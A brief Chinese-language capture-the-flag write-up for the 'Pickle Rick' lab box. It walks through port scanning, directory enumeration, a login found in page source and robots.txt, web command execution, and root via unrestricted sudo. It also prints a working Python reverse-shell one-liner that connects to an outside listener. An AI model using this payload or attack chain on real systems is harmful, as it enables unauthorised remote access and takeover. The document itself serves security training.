# Pickle Rick

瑞克和莫蒂的CTF。 帮助瑞克变回人类！

---

## 端口扫描

循例 nmap扫：

    22/tcp open  ssh
    80/tcp open  http

上80的web看看

## web目录扫描

    gobuster dir --url http://10.10.20.183/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt

    /robots.txt 一串字符串
    /denied.php -> 重定向到login.php

主页源代码披露用户名：

     <!--

        Note to self, remember username!

        Username: R1ckRul3s

    -->

用户名有了，登录系统都有了，不妨再试试那串字符串是不是密码

登录成功

## RCE

一个命令执行框入目眼帘，执行whoami成功返回结果

## Reverse shell

python3 -V正常返回结果，故利用python getshell

payload:

    python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.39.48",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

成功

## 权限提升

查看sudo -l

    (ALL) NOPASSWD: ALL

太简单了，直接：

    sudo su

    root@ip-10-10-20-183:/var/www/html# whoami
    root

第一种成分是在 Sup3rS3cretPickl3Ingred.txt

第二种成分是在：

    root@ip-10-10-20-183:/home/rick# cat "second ingredients"

第三种成分是在/root下：

    root@ip-10-10-20-183:~# cat ./3rd.txt
